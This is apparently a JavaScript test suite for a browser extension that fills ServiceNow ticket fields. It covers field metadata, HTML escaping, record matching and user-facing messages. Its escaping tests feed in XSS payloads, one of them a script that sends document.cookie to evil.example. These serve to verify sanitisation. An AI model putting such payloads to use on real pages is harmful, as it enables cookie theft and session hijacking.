import test from 'node:test';
import assert from 'node:assert/strict';
import {
  FILLABLE_FIELDS,
  FILL_REASONS,
  FILL_REASON_TEXT,
  buildFillMessage,
  currentFromPage,
  emailClientTarget,
  expectFromPage,
  fieldMeta,
  fillModeFor,
  insertedNote,
  isCustomerVisible,
  isFillable,
  isHtmlField,
  isSingleLineField,
  matchesExpect,
  parseExpect,
  sourceFromPack,
  toOneLine,
  toSafeHtml,
  wrongRecordText,
} from '../src/lib/fillable.js';
import { FEATURES, insertsFor } from '../src/features/registry.js';
import { FORM_FIELD_NAMES, FORM_FIELDS, isCustomerVisible as formIsCustomerVisible } from '../src/compose/formFields.js';
import { FILLABLE_FIELDS as NOTES_FIELDS } from '../src/compose/notesToTicket.js';
import { MSG } from '../src/lib/messages.js';

const A = 'a'.repeat(32);
const B = 'b'.repeat(32);

// ---- The list of fields ------------------------------------------------------------------------------------------------

test('every field a feature inserts into can be filled, so a new feature cannot silently fail to insert', () => {
  const missing = [];
  let count = 0;
  for (const feature of FEATURES) {
    for (const spec of insertsFor(feature)) {
      count += 1;
      if (!isFillable(spec.field)) missing.push(`${feature.id}: ${spec.field}`);
    }
  }
  assert.ok(count >= 20, `found ${count} inserts in the registry`);
  assert.deepEqual(missing, [], 'add the field to FILLABLE_FIELDS in src/lib/fillable.js');
});

test('the Write section\'s fields can be filled too: the form fields, the email body and subject, the notes-to-ticket fields', () => {
  for (const name of [...FORM_FIELD_NAMES, 'body', 'subject', ...NOTES_FIELDS]) assert.ok(isFillable(name), name);
});

test('the metadata the lead asked for', () => {
  assert.deepEqual(fieldMeta('text'), { html: true, customerVisible: true });
  assert.equal(isHtmlField('text'), true);
  for (const name of Object.keys(FILLABLE_FIELDS).filter((n) => n !== 'text')) assert.equal(isHtmlField(name), false, name);
  assert.equal(isSingleLineField('short_description'), true);
  assert.equal(isSingleLineField('subject'), true);
  for (const name of ['comments', 'work_notes', 'close_notes', 'description', 'body', 'text']) assert.equal(isSingleLineField(name), false, name);
  for (const name of ['comments', 'close_notes', 'text', 'short_description', 'description', 'body']) assert.equal(isCustomerVisible(name), true, name);
  for (const name of ['work_notes', 'cause_notes', 'workaround']) assert.equal(isCustomerVisible(name), false, name);
});

test('a field nobody described counts as customer-visible (the safe side) and cannot be filled', () => {
  assert.equal(isCustomerVisible('u_custom_field'), true);
  assert.equal(isCustomerVisible(undefined), true);
  for (const name of ['state', 'assigned_to', 'approval', 'u_custom_field', 'sys_id', '__proto__', 'constructor', 'toString', '', undefined, null, 42]) {
    assert.equal(isFillable(name), false, String(name));
    assert.equal(fieldMeta(name), null, String(name));
  }
});

test('the form-field list and the check agree on what the customer can read (one source of truth)', () => {
  for (const f of FORM_FIELDS) {
    assert.equal(f.customerVisible, isCustomerVisible(f.name), f.name);
    assert.equal(f.singleLine, isSingleLineField(f.name), f.name);
    assert.equal(formIsCustomerVisible(f.name), isCustomerVisible(f.name), f.name);
  }
});

test('the table is frozen: no code can add a fillable field at run time', () => {
  assert.throws(() => { 'use strict'; FILLABLE_FIELDS.state = {}; }, TypeError);
  assert.throws(() => { 'use strict'; FILLABLE_FIELDS.text.html = false; }, TypeError);
});

// ---- Plain text for an HTML field --------------------------------------------------------------------------------------

test('markup in a model answer becomes escaped characters, never a tag', () => {
  const html = toSafeHtml('<img src=x onerror=1>');
  assert.equal(html, '<p>&lt;img src=x onerror=1&gt;</p>');
  assert.ok(html.includes('&lt;img'));
  const attack = toSafeHtml('Fix: <a href="javascript:alert(1)">click</a> <script>fetch("https://evil.example/?d="+document.cookie)</script> & it\'s "done"');
  assert.ok(!/<(a|script|img)\b/i.test(attack));
  assert.ok(attack.includes('&lt;script&gt;') && attack.includes('&quot;') && attack.includes('&#39;') && attack.includes('&amp;'));
});

test('a blank line starts a paragraph, a line break is <br>, and the only tags are the ones it writes', () => {
  assert.equal(toSafeHtml('Symptoms\nThe VPN drops.\n\n1. Restart\n2. Retry'), '<p>Symptoms<br>The VPN drops.</p>\n<p>1. Restart<br>2. Retry</p>');
  assert.equal(toSafeHtml('one\r\n\r\ntwo'), '<p>one</p>\n<p>two</p>');
  assert.equal(toSafeHtml('a\n \t \nb'), '<p>a</p>\n<p>b</p>', 'a line with only spaces is a blank line');
  assert.equal(toSafeHtml(''), '');
  assert.equal(toSafeHtml('   \n  '), '');
  assert.equal(toSafeHtml(null), '');
  assert.equal(toSafeHtml('A & B'), '<p>A &amp; B</p>');
  assert.equal(toSafeHtml('Type <your-user-id> in the box'), '<p>Type &lt;your-user-id&gt; in the box</p>');
});

test('nothing but <p>, </p> and <br> can come out of toSafeHtml, whatever goes in', () => {
  const corpus = [
    '<', '>', '&', '&lt;script&gt;', '&#60;img&#62;', '<<>>', '<!-- x -->', '<?php ?>', '<svg onload=alert(1)>', '</p><p>', '<br>', '<img src=x>',
    '[code]<b>x</b>[/code]', 'javascript:alert(1)', '"><img src=x onerror=1>', "'><svg/onload=1>", '<a\nhref=x>', '\n\n\n<p>\n\n',
  ];
  for (const input of corpus) {
    const out = toSafeHtml(input);
    const stripped = out.replace(/<\/?p>|<br>/g, '');
    assert.ok(!stripped.includes('<') && !stripped.includes('>'), `${JSON.stringify(input)} -> ${out}`);
    assert.ok(!/&(?!amp;|lt;|gt;|quot;|#39;)/.test(stripped), `${JSON.stringify(input)} has a raw ampersand`);
  }
  // a thousand random strings of the characters that matter
  const alphabet = ['<', '>', '&', '"', "'", '\n', ' ', 'a', '/', '!', ';', '#', '3', '9'];
  let seed = 7;
  const next = () => (seed = (seed * 1103515245 + 12345) & 0x7fffffff);
  for (let i = 0; i < 1000; i += 1) {
    const input = Array.from({ length: 1 + (next() % 40) }, () => alphabet[next() % alphabet.length]).join('');
    const out = toSafeHtml(input);
    const stripped = out.replace(/<\/?p>|<br>/g, '');
    assert.ok(!stripped.includes('<') && !stripped.includes('>'), JSON.stringify(input));
  }
});

test('one-line helpers', () => {
  assert.equal(toOneLine('  Title\n\nwith   breaks\t'), 'Title with breaks');
  assert.equal(fillModeFor('short_description', 'append'), 'replace', 'a title is never appended to');
  assert.equal(fillModeFor('subject', 'append'), 'replace');
  assert.equal(fillModeFor('comments', 'append'), 'append');
  assert.equal(fillModeFor('comments', 'replace'), 'replace');
  assert.equal(fillModeFor('comments', undefined), 'append');
  assert.equal(fillModeFor('work_notes', 'anything'), 'append');
});

// ---- The record a text was written for ------------------------------------------------------------------------------------

test('parseExpect understands the three shapes and treats anything else as invalid', () => {
  assert.equal(parseExpect(undefined), null);
  assert.equal(parseExpect(null), null);
  assert.deepEqual(parseExpect({ table: 'incident', sysId: A.toUpperCase() }), { kind: 'record', table: 'incident', sysId: A });
  assert.deepEqual(parseExpect({ table: 'incident', newRecord: true }), { kind: 'new', table: 'incident' });
  assert.deepEqual(parseExpect({ email: true, table: 'incident', sysId: A }), { kind: 'email', table: 'incident', sysId: A });
  for (const bad of ['x', 3, [], {}, { table: 'incident' }, { table: 'incident', sysId: 'nope' }, { table: 'Inc ident', sysId: A }, { sysId: A }, { table: 'incident', email: true }, { table: '', newRecord: true }]) {
    assert.equal(parseExpect(bad), 'invalid', JSON.stringify(bad));
  }
});

test('matchesExpect: a saved record, a blank form, the email client', () => {
  const rec = (table, sysId) => ({ record: { table, sysId }, newRecord: null, href: 'https://x.service-now.com/incident.do' });
  assert.equal(matchesExpect({ table: 'incident', sysId: A }, rec('incident', A)), true);
  assert.equal(matchesExpect({ table: 'incident', sysId: A }, rec('incident', B)), false, 'another incident');
  assert.equal(matchesExpect({ table: 'incident', sysId: A }, rec('problem', A)), false, 'another table');
  assert.equal(matchesExpect({ table: 'incident', sysId: A }, { record: null, newRecord: { table: 'incident' } }), false, 'a blank form is not that record');
  assert.equal(matchesExpect({ table: 'incident', sysId: A }, {}), false);
  assert.equal(matchesExpect({ table: 'incident', sysId: A }, undefined), false);
  // a blank form of that table
  assert.equal(matchesExpect({ table: 'kb_knowledge', newRecord: true }, { record: null, newRecord: { table: 'kb_knowledge' } }), true);
  assert.equal(matchesExpect({ table: 'kb_knowledge', newRecord: true }, { record: null, newRecord: { table: 'incident' } }), false);
  assert.equal(matchesExpect({ table: 'kb_knowledge', newRecord: true }, rec('kb_knowledge', A)), false, 'a saved article is not a blank form');
  // no expectation at all: anything goes; an invalid one: nothing does
  assert.equal(matchesExpect(undefined, {}), true);
  assert.equal(matchesExpect(null, {}), true);
  assert.equal(matchesExpect({ table: 'incident' }, rec('incident', A)), false);
  assert.equal(matchesExpect('incident', rec('incident', A)), false);
});

test('matchesExpect for the email client: the address names the record, also inside the classic shell', () => {
  const want = { email: true, table: 'incident', sysId: A };
  const at = (href) => ({ href });
  const direct = `https://x.service-now.com/email_client.do?sysparm_table=incident&sysparm_sys_id=${A}&sysparm_target=incident&sysparm_uniqueValue=${A}`;
  assert.equal(matchesExpect(want, at(direct)), true);
  assert.equal(matchesExpect(want, at(direct.replace(A, B))), false, 'the email form of another record');
  assert.equal(matchesExpect(want, at(direct.replace('sysparm_table=incident', 'sysparm_table=problem'))), false);
  assert.equal(matchesExpect(want, at(`https://x.service-now.com/incident.do?sys_id=${A}`)), false, 'the record itself is not its email form');
  const wrapped = `https://x.service-now.com/nav_to.do?uri=${encodeURIComponent(`email_client.do?sysparm_table=incident&sysparm_sys_id=${A}`)}`;
  assert.equal(matchesExpect(want, at(wrapped)), true);
  assert.equal(matchesExpect(want, at('not a url')), false);
  assert.equal(matchesExpect(want, {}), false);
  assert.deepEqual(emailClientTarget(direct), { table: 'incident', sysId: A });
  assert.equal(emailClientTarget('https://x.service-now.com/incident.do'), null);
});

test('expectFromPage, currentFromPage and sourceFromPack', () => {
  assert.deepEqual(expectFromPage({ record: { table: 'incident', sysId: A } }), { table: 'incident', sysId: A });
  assert.deepEqual(expectFromPage({ record: null, newRecord: { table: 'kb_knowledge' } }), { table: 'kb_knowledge', newRecord: true });
  assert.equal(expectFromPage({ record: null, newRecord: null }), null);
  assert.equal(expectFromPage(null), null);
  assert.equal(expectFromPage({ record: { table: 'incident', sysId: 'x' } }), null, 'a record without a real sys_id is not an expectation');
  assert.deepEqual(currentFromPage({ record: { table: 'incident', sysId: A }, href: 'https://x/' }), { record: { table: 'incident', sysId: A }, newRecord: null, href: 'https://x/' });
  assert.deepEqual(sourceFromPack({ table: 'incident', sysId: A, number: 'INC0010001' }), { expect: { table: 'incident', sysId: A }, number: 'INC0010001' });
  assert.equal(sourceFromPack({ table: 'compose', sysId: 'compose' }), null, 'a pasted text stands for no record');
  assert.equal(sourceFromPack(null), null);
});

test('the message the panel sends: the one-line rule, the default expectation and the explicit "any form"', () => {
  const page = { record: { table: 'incident', sysId: A } };
  const m = buildFillMessage({ field: 'short_description', value: 'T', label: 'Short description', mode: 'append', page });
  assert.deepEqual(m, { type: MSG.FILL_FIELD, field: 'short_description', value: 'T', label: 'Short description', mode: 'replace', expect: { table: 'incident', sysId: A } });
  const any = buildFillMessage({ field: 'comments', value: 'x', mode: 'append', expect: null, page });
  assert.equal('expect' in any, false);
  const given = buildFillMessage({ field: 'comments', value: 'x', mode: 'append', expect: { table: 'incident', newRecord: true }, page });
  assert.deepEqual(given.expect, { table: 'incident', newRecord: true });
  const none = buildFillMessage({ field: 'comments', value: 'x', page: { record: null, newRecord: null } });
  assert.equal('expect' in none, false);
});

test('what the person reads', () => {
  assert.equal(wrongRecordText({ expect: { table: 'incident', sysId: A }, number: 'INC0010001' }), 'This was written for INC0010001. Open that ticket again, or use Copy.');
  assert.match(wrongRecordText({ expect: { table: 'incident', sysId: A } }), /^This was written for another incident record\. Open that ticket again, or use Copy\.$/);
  assert.match(wrongRecordText({ expect: { table: 'kb_knowledge', newRecord: true } }), /a new kb_knowledge form/);
  assert.match(wrongRecordText({ expect: { email: true, table: 'incident', sysId: A }, number: 'INC1' }), /email form of INC1/);
  assert.match(wrongRecordText(null), /another record/);
  assert.equal(insertedNote({ ok: true, method: 'gform' }), 'Inserted into the form. Review it, then save the record yourself.');
  assert.match(insertedNote({ ok: true, method: 'dom', label: 'Additional comments' }), /box labelled "Additional comments"/);
  assert.equal(insertedNote({ ok: true, method: 'dom' }), 'Inserted into the form. Review it, then save the record yourself.');
  for (const reason of FILL_REASONS) assert.ok(FILL_REASON_TEXT[reason].length > 10, reason);
  assert.ok(FILL_REASONS.includes('wrong-record'));
});
